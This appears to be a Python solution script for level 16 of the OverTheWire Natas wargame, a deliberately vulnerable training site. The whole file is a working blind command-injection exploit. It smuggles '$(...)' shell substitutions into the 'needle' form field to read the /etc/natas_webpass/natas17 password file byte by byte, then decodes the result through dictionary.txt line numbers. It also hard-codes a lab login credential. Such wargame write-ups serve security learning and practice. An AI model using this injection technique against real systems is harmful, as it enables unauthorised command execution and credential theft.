import requests
from requests.auth import HTTPBasicAuth  
from urllib.parse import quote
import base64
import re

base_url = 'http://natas16.natas.labs.overthewire.org'
auth = HTTPBasicAuth('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh')  

#extract natas17 password
matches = []
for pair in range(16): 
  payload=f'^$(sed -n $(od -An -tu2 -w64 -N2 -j{2*pair}< /etc/natas_webpass/natas17)p < dictionary.txt)$'
  r = requests.post(base_url, data={"needle": payload}, auth=auth)
  reply_text = r.text.replace('\n', ' ').replace('\r', '')
  m = re.search('<pre>(.+)</pre>', reply_text)
  word = m.group(1).strip()
  matches.append(word)

#grab dictionary.txt
r = requests.get(f'{base_url}/dictionary.txt', auth=auth)
diclines = r.text.splitlines()
print(matches)

elb = []
for m in matches:
  i = diclines.index(m)+1
  elb.append(i & 255)
  elb.append(i >> 8)

#password
print("".join([chr(c) for c in elb]))
